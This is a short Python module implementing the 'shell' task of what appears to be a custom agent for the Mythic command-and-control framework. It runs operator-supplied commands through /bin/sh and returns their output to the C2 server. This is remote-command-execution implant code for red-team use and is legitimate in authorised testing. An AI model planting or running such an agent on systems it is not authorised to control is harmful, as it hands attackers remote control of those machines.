import subprocess
import json


# Called by handle_task() in agent.py when Mythic sends a task with command="shell".
# params      — JSON string from Mythic e.g. '{"command": "whoami"}' — must be parsed first
# task_id     — Mythic's task UUID, available here for commands that need mid-task responses
# callback_id — this agent's callback UUID, available here for the same reason
# Returns a string which handle_task() forwards to post_response() to display in the UI.
def execute(params, task_id, callback_id):
    try:
        # Mythic sends parameters as a JSON string when named parameters are defined.
        # Extract the "command" key to get the actual shell command to run.
        cmd = json.loads(params).get("command", "")
    except Exception:
        cmd = params  # fallback to raw string if parsing fails

    try:
        result = subprocess.run(
            cmd,
            shell=True,           # pass to /bin/sh so pipes, redirects, etc. work
            capture_output=True,  # capture stdout and stderr instead of printing to terminal
            text=True,            # return strings instead of raw bytes
            timeout=30            # kill the process after 30s so a hanging command doesn't freeze the agent
        )
        # Combine stdout and stderr so both normal output and error messages come back to the operator
        return result.stdout + result.stderr
    except Exception as e:
        # On timeout or other failure, return the error as a string so the operator sees what went wrong
        return str(e)
